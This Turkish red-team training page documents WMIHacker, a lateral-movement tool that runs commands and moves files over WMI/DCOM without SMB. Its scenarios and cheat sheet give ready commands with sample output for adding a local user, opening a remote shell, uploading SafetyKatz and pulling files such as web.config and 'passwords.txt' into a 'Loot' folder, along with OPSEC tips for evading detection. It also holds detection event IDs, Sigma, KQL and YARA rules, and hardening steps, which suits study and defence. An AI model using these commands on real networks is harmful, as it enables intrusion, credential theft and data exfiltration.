# WMIHacker

> **Kategori:** [11. Yanal Hareket ve Uzak Kod Yürütme](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Hedef sistemde SMB (TCP 445) ve diğer yönetim portları kapalıyken, yalnızca WMI/RPC (TCP 135) üzerinden komut çalıştırma, Registry tabanlı çıktı okuma ve dosya transferi sağlayan kırmızı takım yanal hareket aracı.

---

## 1. Genel Bakış ve Amaç

Active Directory ağlarında yanal hareket denetimleri gerçekleştirilirken en sık karşılaşılan engellerden biri, modern kurumsal ağ segmentasyonu ve uç nokta güvenlik duvarı politikaları gereğince SMB (TCP 445 ve TCP 139) portlarının iş istasyonları arasında sıkı şekilde filtrelenmesidir. Geleneksel WMI yanal hareket araçları (`impacket-wmiexec` dahil), WMI (`Win32_Process.Create`) aracılığıyla kod çalıştırabilseler dahi, yürütülen komutun ekran çıktısını (`stdout`/`stderr`) alabilmek için hedef sistemin `ADMIN$` veya `C$` paylaşımlarına SMB üzerinden geçici metin dosyası yazmak ve okumak zorundadır. Hedefte SMB kapalıysa veya paylaşımlar kısıtlanmışsa bu araçlar çıktı üretemez.

**WMIHacker** (pure105 tarafından geliştirilmiştir), bu operasyonel kısıtlamayı aşmak amacıyla tasarlanmıştır. Araç, SMB portuna hiçbir şekilde bağımlı olmaksızın, **yalnızca TCP 135** (DCOM/RPC) ve dinamik RPC portları üzerinden çalışır. Komut çıktılarını SMB paylaşımı yerine hedef sistemin Windows Registry (Kayıt Defteri) kovanına (`StdRegProv` WMI sağlayıcısı kullanarak) yazar, çıktıyı WMI üzerinden okur ve ardından oluşturulan kayıtları temizler. Bu sayede dosya paylaşımı gerektirmeyen, son derece gizli ve esnek bir uzak yönetim kanalı sunar.

### Mimari Akış Şeması

```
+-----------------------------------------------------------------------------------+
|                              WMIHACKER MIMARI AKIŞI                               |
+-----------------------------------------------------------------------------------+
  [Denetim İstasyonu]                                [Hedef Windows Sunucusu]
     (WMIHacker)                                       (WMI / DCOM Servisi)
          |                                                     |
          |--- 1. RPC Portmapper Bağlantısı (TCP 135) --------->|
          |       [DCOM Interface Bind: IWbemServices]          |
          |                                                     |--- 2. Dinamik RPC Portu
          |<-- 2. Dinamik RPC Port Tahsisi (TCP 49152-65535) ---|
          |                                                     |
          |--- 3. Win32_Process.Create (WMI) ------------------>|--- 3. wmiprvse.exe
          |       [cmd.exe /c "komut > C:\temp\out.txt"]        |       Komutu Yürütür
          |                                                     |
          |--- 4. StdRegProv::SetStringValue ------------------>|--- 4. Çıktı Dosyası
          |       (VBScript/WMI ile Çıktıyı Registry'ye Yazar)  |       Registry'ye Aktarılır
          |                                                     |       (HKLM veya HKCU)
          |--- 5. StdRegProv::GetStringValue ------------------>|
          |<-- 6. Registry İçeriği WMI Kanaliyla Döner ---------|--- 5. Çıktı İstemciye Gelir
          |                                                     |
          |--- 7. Temizlik: StdRegProv::DeleteValue ------------>|--- 6. Registry ve Geçici
          |       (Geçici Registry Değerleri ve Dosyalar Silinir)|       Dosyalar İmha Edilir
```

### Neden Önemli?

| Yetenek | Operasyonel Avantaj | Alternatif Araçlara Üstünlüğü |
| :--- | :--- | :--- |
| **SMB Bağımsızlığı** | TCP 445 ve 139 portlarına hiç ihtiyaç duymaz. | SMB kapalı veya filtrelenmiş ağlarda tam fonksiyonel çalışır. |
| **Registry Tabanlı Çıktı** | Komut çıktılarını `StdRegProv` ile okur. | `ADMIN$` veya `C$` paylaşım izinlerine gerek bırakmaz. |
| **İki Yönlü Dosya Transferi**| WMI/DCOM kanalı üzerinden dosya yükler ve indirir. | Ağda FTP, HTTP veya SMB transfer izi bırakmaz. |
| **Düşük Ağ İmzası** | Yalnızca meşru DCOM/WMI yönetim trafiği üretir. | Ağ seviyesinde SMB oturum denetimlerini (Event ID 5140) atlatır. |
| **Hafif Çalışma Formatı** | VBScript veya Python mimarisiyle bağımlılıksız çalışır.| Hedefe ajan veya üçüncü parti servis yüklemesi gerektirmez. |

### Karşılaştırma Tablosu

| Özellik | WMIHacker | impacket-wmiexec | impacket-psexec | Evil-WinRM |
| :--- | :--- | :--- | :--- | :--- |
| **Gereken Açık Portlar** | Yalnızca TCP 135 (+ RPC) | TCP 135 + TCP 445 | Yalnızca TCP 445 | TCP 5985 / 5986 |
| **SMB Gereksinimi** | Hayır (Sıfır SMB Trafiği) | Evet (Çıktı okuma için zorunlu) | Evet (Servis ikilisi için zorunlu) | Hayır (WS-Man HTTP) |
| **Çıktı İletim Yolu** | WMI `StdRegProv` Registry | SMB Paylaşımı (.txt dosyası) | SMB Named Pipe | HTTP/HTTPS SOAP Yanıtı |
| **Hedefte Servis Kaydı** | Hayır | Hayır | Evet (Windows Servisi) | Hayır |
| **Dosya Transfer Kabiliyeti**| Evet (WMI Üzerinden) | Evet (SMB Üzerinden) | Evet (SMB Üzerinden) | Evet (WS-Man SOAP) |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

WMIHacker, VBScript (`cscript WMIHacker.vbs`) veya Python varyantı üzerinden hedef sistem bilgileri, kimlik parametreleri ve operasyonel modlarla tetiklenir:

```cmd
cscript 1_WMIHacker.vbs /cmd <host> <user> <pass> "<command>" <GET_OUTPUT_FLAG>
```

### Desteklenen Kritik Bayraklar

| Parametre | Açıklama | Kabul Ettiği Değerler / Örnek |
| :--- | :--- | :--- |
| `/cmd` | Hedef sistemde tekil bir komut çalıştırır. | `/cmd 192.168.1.50 admin pass "whoami" 1` |
| `/shell` | Etkileşimli yarı-dinamik bir WMI komut kabuğu başlatır. | `/shell 192.168.1.50 admin pass 1` |
| `/upload` | Yerel bir dosyayı WMI üzerinden hedef sisteme yükler. | `/upload 192.168.1.50 admin pass "C:\local.exe" "C:\remote.exe"` |
| `/download` | Hedefteki bir dosyayı WMI üzerinden yerel sisteme indirir. | `/download 192.168.1.50 admin pass "C:\remote.txt" "C:\local.txt"` |
| `<host>` | Hedef sistemin IP adresi, NetBIOS adı veya FQDN değeri. | `192.168.1.50`, `FS01.corp.local` |
| `<user>` | Yetkilendirme yapılacak kullanıcı hesabı. | `Administrator`, `corp\admin` |
| `<pass>` | Kullanıcı hesabına ait düz metin parola. | `P@ssw0rd2026!` |
| `<command>` | Hedef sistemde çalıştırılacak Windows komut dizesi. | `"whoami /all"`, `"ipconfig /all"` |
| `<GET_OUTPUT>`| Çıktı alma modu (`0`: Çıktısız kör mod, `1`: Registry üzerinden çıktılı mod). | `0` veya `1` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: SMB Kapalıyken Çıktısız Hızlı Komut Çalıştırma (Kör Mod)
SMB (Port 445) engeli olan bir hedefte çıktı beklenmeksizin arka planda bir servis başlatma veya yerel kullanıcı ekleme:

```cmd
cscript 1_WMIHacker.vbs /cmd 192.168.1.50 administrator 'P@ssw0rd2026!' "net user auditor Aud1tPass2026! /add" 0
```

**Konsol Çıktı Analizi:**
```
Microsoft (R) Windows Script Host Version 5.812
Copyright (C) Microsoft Corporation. All rights reserved.

[*] Target: 192.168.1.50
[*] Mode: Blind Command Execution (No Output)
[*] Command: net user auditor Aud1tPass2026! /add
[*] Connecting to WMI Service via DCOM (TCP 135)...
[*] Win32_Process.Create executed successfully. Process ID: 3512
[+] Command launched in background without SMB dependency.
```

### Senaryo 2: Registry Yönlendirmeli Çıktı Alma Modu
Hedef sunucunun ağ yapılandırmasını ve etki alanı rollerini öğrenmek için çıktıyı WMI `StdRegProv` üzerinden çekme:

```cmd
cscript 1_WMIHacker.vbs /cmd 192.168.1.50 administrator 'P@ssw0rd2026!' "ipconfig /all" 1
```

**Konsol Çıktı Analizi:**
```
[*] Target: 192.168.1.50
[*] Mode: Output Redirection via Registry (StdRegProv)
[*] Executing command and capturing stdout...
[*] Reading output from registry key: HKLM\SOFTWARE\Classes\AppID\...
[*] Cleaning up temporary registry keys...

Windows IP Configuration

   Host Name . . . . . . . . . . . . : SRV-BACKUP01
   Primary Dns Suffix  . . . . . . . : corp.local
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No

Ethernet adapter vEthernet:
   IPv4 Address. . . . . . . . . . . : 192.168.1.50(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.1.1
```

### Senaryo 3: Etkileşimli WMI Yarı-Kabuk (Shell) Başlatma
SMB kullanmadan hedef sistemde sürekli komut gönderebilecek bir yönetim oturumu açma:

```cmd
cscript 1_WMIHacker.vbs /shell 192.168.1.50 corp\jdoe 'Winter2026!' 1
```

**Konsol Çıktı Analizi:**
```
[*] Initializing WMI Pseudo-Shell on 192.168.1.50...
[*] Connected. Type 'exit' to terminate session.

WMIHacker-Shell (192.168.1.50)> whoami
corp\jdoe

WMIHacker-Shell (192.168.1.50)> hostname
SRV-BACKUP01

WMIHacker-Shell (192.168.1.50)> exit
[*] Cleaning environment and exiting shell.
```

### Senaryo 4: Port 445 Olmadan Uzak Sistemden Dosya Çekme (Download)
Hedef makinedeki bir yapılandırma dosyasını WMI üzerinden Base64/Stream yöntemiyle yerel makineye aktarma:

```cmd
cscript 1_WMIHacker.vbs /download 192.168.1.50 administrator 'P@ssw0rd2026!' "C:\inetpub\wwwroot\web.config" "C:\Loot\web.config"
```

**Konsol Çıktı Analizi:**
```
[*] Initiating file download via WMI DCOM channel...
[*] Remote File: C:\inetpub\wwwroot\web.config
[*] Reading remote file chunks via WMI Provider...
[+] 4096 bytes read.
[+] Download completed. File saved to C:\Loot\web.config
```

### Senaryo 5: Hedefe WMI Kanalı ile Dosya Yükleme (Upload)
Uzak sistemde güvenlik denetimi için gerekli bir denetim aracını SMB paylaşımı kullanmadan karşı tarafa iletme:

```cmd
cscript 1_WMIHacker.vbs /upload 192.168.1.50 administrator 'P@ssw0rd2026!' "C:\Tools\SafetyKatz.exe" "C:\Windows\Temp\SafetyKatz.exe"
```

**Konsol Çıktı Analizi:**
```
[*] Initiating file upload via WMI DCOM channel...
[*] Local Source: C:\Tools\SafetyKatz.exe
[*] Target Path : C:\Windows\Temp\SafetyKatz.exe
[*] Encoding payload and pushing through WMI StdRegProv / FileSystem...
[+] Upload complete: 184320 bytes written to destination.
```

### Senaryo 6: Yerel Yönetici Yetkileri ile Etki Alanı Üyesi Olmayan Sistemden Erişim
Denetim makinesi çalışma grubunda (Workgroup) iken hedef etki alanı üyesi sunucuya açık kimlik bilgileriyle bağlanma:

```cmd
cscript 1_WMIHacker.vbs /cmd 192.168.1.50 .\Administrator 'LocalAdminPass123!' "whoami /priv" 1
```

**Konsol Çıktı Analizi:**
```
[*] Connecting to 192.168.1.50 with local account .\Administrator...
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                          State
============================= ==================================== ========
SeSecurityPrivilege           Manage auditing and security log     Disabled
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Kodu / Mesajı | Kök Neden | Kesin Çözüm Adımı |
| :--- | :--- | :--- |
| `SWbemLocator: Access is denied (0x80070005)` | Kullanıcının DCOM veya WMI erişim yetkisi yok; yerel hesaplarda `LocalAccountTokenFilterPolicy` kısıtlaması devrede. | Kullanıcı kimlik bilgilerini doğrulayın; hedefte yerel hesap ise `LocalAccountTokenFilterPolicy=1` ayarlandığını teyit edin. |
| `The RPC server is unavailable (0x800706BA)` | Hedef sistemde TCP 135 portu veya dinamik RPC portları (49152-65535) güvenlik duvarı tarafından engelleniyor. | Güvenlik duvarında "Windows Management Instrumentation (WMI)" kural grubunun gelen bağlantılara açık olduğunu teyit edin. |
| `Registry Write Error (0x80041003 in StdRegProv)` | Belirtilen registry kovanında (HKLM) kullanıcının yazma izni bulunmuyor veya UAC kısıtlaması etkin. | Çıktı depolama yolunu `HKLM` yerine `HKCU\Software\Classes` veya kullanıcının kendi kovanına yönlendirin. |
| `Output Timeout / Truncated Buffer` | Komutun ürettiği çıktı WMI'ın tek seferde okuyabileceği Registry dize limitini aşıyor veya komut uzun sürüyor. | Çıktıyı doğrudan `more` veya `findstr` ile filtreleyerek çekin; betik içerisindeki bekleme süresini (Sleep) artırın. |
| `Windows Script Host access is disabled on this machine` | İstemci veya hedef makinede `cscript.exe` / `wscript.exe` çalıştırılması GPO ile kısıtlanmış. | Python tabanlı WMIHacker sürümünü (`WMIHacker.py`) kullanın veya GPO kısıtlamasını kaldırın. |
| `SWbemServices: Invalid namespace` | WMI bağlantısı sırasında hedeflenen `root\cimv2` veya `root\default` isim alanı bozulmuş. | Hedef sunucuda yönetici yetkisiyle `winmgmt /resetrepository` komutuyla WMI deposunu onarın. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
[OPSEC GÜRÜLTÜ SKALASI: ORTA - DÜŞÜK]
0 ------------[4.5 - ZERO-SMB WMI & REGISTRY]------------ 10
  - Ağ Seviyesi: Yalnızca TCP 135/RPC iletişimi (Sıfır SMB trafiği, NIDS tespiti son derece zor)
  - Uç Nokta Seviyesi: wmiprvse.exe alt süreci ve geçici Registry değişiklikleri (Sysmon ile izlenebilir)
```

### 5.1 Bırakılan İzler (Event Logs)

* **Windows Security Event ID 4624 (Başarılı Oturum Açma):**
  * `Logon Type: 3` (Network Logon) olarak kaydedilir.
  * Kimlik doğrulama paketi: `NTLM` veya `Kerberos`.
* **Sysmon Event ID 1 (Process Creation):**
  * Parent Image: `C:\Windows\System32\wbem\WmiPrvSE.exe`
  * CommandLine: `cmd.exe /c "komut > C:\Windows\Temp\out.txt"`
* **Sysmon Event ID 12 / 13 / 14 (Registry Event):**
  * WMIHacker çıktıyı Registry'ye yazarken `HKLM\SOFTWARE\...` veya `HKCU\Software\...` altında şüpheli anahtar oluşturma ve değer yazma olayları günlüğe kaydedilir.
* **Microsoft-Windows-WMI-Activity/Operational (Event ID 5857):**
  * `StdRegProv` ve `Win32_Process` WMI sağlayıcılarının dinamik olarak çağrıldığı kaydedilir.

### 5.2 Ağ ve EDR İmzaları

* **Sıfır SMB (Zero-SMB) Karakteristiği:**
  Geleneksel SIEM/EDR yanal hareket korelasyonları, TCP 135 trafiğinin hemen ardından TCP 445 SMB bağlantısı ve `ADMIN$` paylaşımı erişimi bekler. WMIHacker'da SMB bağlantısının hiç bulunmaması, klasik korelasyon kurallarını körleştirebilir.
* **Registry Çıktı İmzası:**
  Komut çıktılarının Registry değerlerine Base64 veya ham dize olarak yazılması, davranışsal EDR sensörlerinin "Registry Hijacking / Tampering" alarmlarını tetikleyebilir.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Taktik | Teknik ID | Teknik Adı | Operasyonel Kullanım |
| :--- | :--- | :--- | :--- |
| **Execution** | `T1047` | Windows Management Instrumentation | Kod yürütme ve Registry nesneleriyle etkileşim. |
| **Defense Evasion** | `T1112` | Modify Registry | Komut çıktılarını gizlemek ve okumak için Registry manipülasyonu. |
| **Execution** | `T1059.005` | Visual Basic | İstemci tarafında VBScript tabanlı WScript/CScript yürütme. |
| **Lateral Movement** | `T1021.002` | Remote Services | DCOM/WMI üzerinden uzak sisteme sıçrama. |

### 5.4 OPSEC Önerileri

| Tespit Riski | Önlem / İyileştirme |
| :--- | :--- |
| **Registry Kalıntıları** | Komut sonrasında `DeleteValue` çağrısının başarıyla çalıştığından ve geride dize kalmadığından emin olunmalıdır. |
| **`wmiprvse.exe` Proses Anomalisi** | Kritik sistemlerde doğrudan `cmd.exe` yerine meşru ikililer (LOLBins) veya WMI sorguları tercih edilmelidir. |
| **Geçici Dosya İmzaları** | Çıktı yönlendirmesinde `C:\Windows\Temp\` yerine meşru uygulama log dizinleri kullanılmalıdır. |
| **VBScript Yürütme İmzası** | Linux platformundan Python tabanlı WMI kütüphaneleriyle doğrudan DCOM konuşan alternatifler tercih edilebilir. |

### 5.5 Savunma Karşılığı

#### Sigma Kuralı: WMI StdRegProv Üzerinden Şüpheli Registry Çıktı Yönlendirmesi
```yaml
title: WMI StdRegProv ile Supheli Registry Manipulasyonu
id: f1a2b3c4-9876-4321-bcde-55aa77889900
status: experimental
description: WMIHacker benzeri araclar tarafindan komut ciktilarini saklamak amaciyla gerceklestirilen olağandisi Registry yazma aktivitelerini yakalar.
references:
    - https://attack.mitre.org/techniques/T1112/
author: Active Directory Guvenlik Ekibi
date: 2026/10/14
logsource:
    category: registry_set
    product: windows
detection:
    selection:
        TargetObject|contains:
            - '\SOFTWARE\Classes\AppID\'
            - '\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\'
        Details|contains:
            - 'Windows IP Configuration'
            - 'Active Directory'
            - 'NT AUTHORITY\SYSTEM'
    condition: selection
falsepositives:
    - Ozel yazilim yukleyicilerinin sistem bilgisi kaydetmesi.
level: high
tags:
    - attack.execution
    - attack.t1047
    - attack.defense_evasion
    - attack.t1112
```

#### Microsoft Sentinel KQL Sorgusu
```kql
// SMB portu kullanilmaksizin sadece 135 portu uzerinden WMI ile baslatilan supheli prosesleri tespit eder
DeviceNetworkEvents
| where RemotePort == 135
| project NetworkTime = TimeGenerated, DeviceName, RemoteIP, InitiatingProcessFileName
| join kind=inner (
    DeviceProcessEvents
    | where InitiatingProcessFileName =~ "wmiprvse.exe"
    | where FileName in~ ("cmd.exe", "powershell.exe")
    | project ProcessTime = TimeGenerated, DeviceName, FileName, ProcessCommandLine, AccountName
) on DeviceName
| where abs(datetime_diff('second', ProcessTime, NetworkTime)) < 60
| project ProcessTime, DeviceName, RemoteIP, FileName, ProcessCommandLine, AccountName
```

#### YARA Kuralı: WMIHacker Script İmzası
```yara
rule Threat_Tool_WMIHacker_VBS {
    meta:
        description = "WMIHacker VBScript aracina ozgu parametre ve fonksiyon imzalarini tespit eder"
        author = "AD Guvenlik Arastirma Laboratuvari"
        date = "2026-10-14"
        severity = "High"
    strings:
        $s1 = "WMIHacker" ascii wide nocase
        $s2 = "StdRegProv" ascii wide
        $s3 = "Win32_Process" ascii wide
        $s4 = "GetStringValue" ascii wide
        $s5 = "/cmd" ascii wide
        $s6 = "/shell" ascii wide
    condition:
        4 of ($s*)
}
```

#### Sertleştirme (Hardening) Adımları
1. **DCOM ve WMI Ağ Filtrelemesi:** Kullanıcı iş istasyonları arasında TCP 135 portu ve dinamik RPC aralıkları anahtar güvenlik duvarı (host-based firewall) kuralları ile kapatılmalıdır.
2. **Registry Erişim Kısıtlamaları:** `HKLM\SOFTWARE` kovanındaki kritik dalların erişim denetim listeleri (ACL) incelenmeli; standart kullanıcıların yazma yetkisi sınırlandırılmalıdır.
3. **WMI Etkinlik Denetimi:** `Microsoft-Windows-WMI-Activity/Operational` günlüğü merkezi SIEM platformuna aktarılarak `StdRegProv` çağrıları düzenli olarak denetlenmelidir.

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

#### 1. SMB Kapalıyken Çıktısız Hızlı Komut Çalıştırma
```cmd
cscript 1_WMIHacker.vbs /cmd 192.168.1.50 admin 'Pass123!' "calc.exe" 0
```
* **Ne Yapar?:** Hedef sistemde çıktı beklemeksizin `Win32_Process.Create` ile süreç başlatır.
* **Ne Zaman Kullanılır?:** SMB portları kapalıyken arka planda komut tetiklemek için.
* **Parametreler:** `/cmd <ip> <user> <pass> <komut> 0`.

#### 2. Registry Üzerinden Çıktı Döndüren Komut Yürütme
```cmd
cscript 1_WMIHacker.vbs /cmd 192.168.1.50 admin 'Pass123!' "whoami /all" 1
```
* **Ne Yapar?:** Komutu çalıştırır, çıktısını Registry'ye yazar, WMI ile okur ve ekrana basar.
* **Ne Zaman Kullanılır?:** SMB paylaşımı olmadan komut sonucunu görmek gerektiğinde.
* **Parametreler:** Çıktı modu bayrağı `1` olarak verilir.

#### 3. WMI Etkileşimli Yarı-Kabuk Başlatma
```cmd
cscript 1_WMIHacker.vbs /shell 192.168.1.50 admin 'Pass123!' 1
```
* **Ne Yapar?:** Sürekli komut girişi sağlayan etkileşimli bir WMI komut istemi açar.
* **Ne Zaman Kullanılır?:** Sistem üzerinde adım adım operasyon yürütülürken.
* **Parametreler:** `/shell <ip> <user> <pass> <output_flag>`.

#### 4. Port 445 Olmadan Dosya İndirme
```cmd
cscript 1_WMIHacker.vbs /download 192.168.1.50 admin 'Pass123!' "C:\passwords.txt" "C:\loot.txt"
```
* **Ne Yapar?:** Hedefteki dosyayı WMI DCOM veri akışı üzerinden yerel diske çeker.
* **Ne Zaman Kullanılır?:** SMB engelli ortamlarda hedeften veri toplamak için.
* **Parametreler:** `/download <ip> <user> <pass> <hedef_dosya> <yerel_hedef>`.

#### 5. Port 445 Olmadan Dosya Yükleme
```cmd
cscript 1_WMIHacker.vbs /upload 192.168.1.50 admin 'Pass123!' "C:\agent.exe" "C:\Windows\Temp\agent.exe"
```
* **Ne Yapar?:** Yerel çalıştırılabilir dosyayı WMI üzerinden hedef sisteme kopyalar.
* **Ne Zaman Kullanılır?:** Hedefe denetim veya analiz aracı aktarırken.
* **Parametreler:** `/upload <ip> <user> <pass> <yerel_kaynak> <hedef_konum>`.

#### 6. Etki Alanı Hesabı ile Uzak Sistem Sorgulama
```cmd
cscript 1_WMIHacker.vbs /cmd 192.168.1.50 corp\admin 'Pass123!' "systeminfo" 1
```
* **Ne Yapar?:** Etki alanı yöneticisi hesabı kullanarak hedef sunucunun donanım ve yama bilgilerini çeker.
* **Ne Zaman Kullanılır?:** Etki alanı genelinde yanal hareket denetimi yaparken.
* **Parametreler:** Kullanıcı adı `corp\admin` biçiminde verilir.

#### 7. Ağ Arayüzlerini ve IP Yapılandırmasını Okuma
```cmd
cscript 1_WMIHacker.vbs /cmd 192.168.1.50 admin 'Pass123!' "route print" 1
```
* **Ne Yapar?:** Hedef makinenin yönlendirme tablosunu Registry üzerinden döndürür.
* **Ne Zaman Kullanılır?:** Çok bacaklı ağlarda iç alt ağları keşfetmek için.
* **Parametreler:** Komut argümanı `"route print"`.

#### 8. Yerel Grup Üyelerini Listeleme
```cmd
cscript 1_WMIHacker.vbs /cmd 192.168.1.50 admin 'Pass123!' "net localgroup administrators" 1
```
* **Ne Yapar?:** Hedefteki yerel yöneticiler grubunun üyelerini ekrana döker.
* **Ne Zaman Kullanılır?:** Hak yükseltme veya erişim yetkisi haritalandırmasında.
* **Parametreler:** Komut argümanı `"net localgroup administrators"`.

#### 9. Kör Modda Güvenlik Duvarı Durumunu İnceleme
```cmd
cscript 1_WMIHacker.vbs /cmd 192.168.1.50 admin 'Pass123!' "netsh advfirewall show allprofiles" 1
```
* **Ne Yapar?:** Windows Güvenlik Duvarı profil durumlarını Registry kanalıyla raporlar.
* **Ne Zaman Kullanılır?:** Port ve protokol engelleme yapılandırmalarını teyit etmek için.
* **Parametreler:** Komut argümanı `"netsh advfirewall show allprofiles"`.

#### 10. Hedefte Servis Durumunu Sorgulama
```cmd
cscript 1_WMIHacker.vbs /cmd 192.168.1.50 admin 'Pass123!' "sc query WinDefend" 1
```
* **Ne Yapar?:** Windows Defender servisinin çalışma durumunu Registry kanalıyla okur.
* **Ne Zaman Kullanılır?:** Uç nokta koruma durumunu uzaktan denetlemek için.
* **Parametreler:** Komut argümanı `"sc query WinDefend"`.

---

## Kaynaklar
* [WMIHacker Resmi GitHub Deposu (pure105)](https://github.com/pure105/WMIHacker)
* [Microsoft Dokümantasyonu: StdRegProv Class (WMI)](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/regprov/stdregprov)
* [Microsoft Dokümantasyonu: Win32_Process Class](https://learn.microsoft.com/en-us/windows/win32/cimwin32prov/win32-process)
* [MITRE ATT&CK: Windows Management Instrumentation (T1047)](https://attack.mitre.org/techniques/T1047/)
* [MITRE ATT&CK: Modify Registry (T1112)](https://attack.mitre.org/techniques/T1112/)
* [HackTricks: Lateral Movement without Port 445](https://book.hacktricks.xyz/windows-hardening/lateral-movement)

---

> **Önceki:** [← SharpWMI](./SharpWMI.md) · **Sonraki:** [ntdsutil (Kategori 12) →](../Kategori_12_NTDS_GPO_Sifreleri_ve_LAPS_Hasadi/ntdsutil.md)
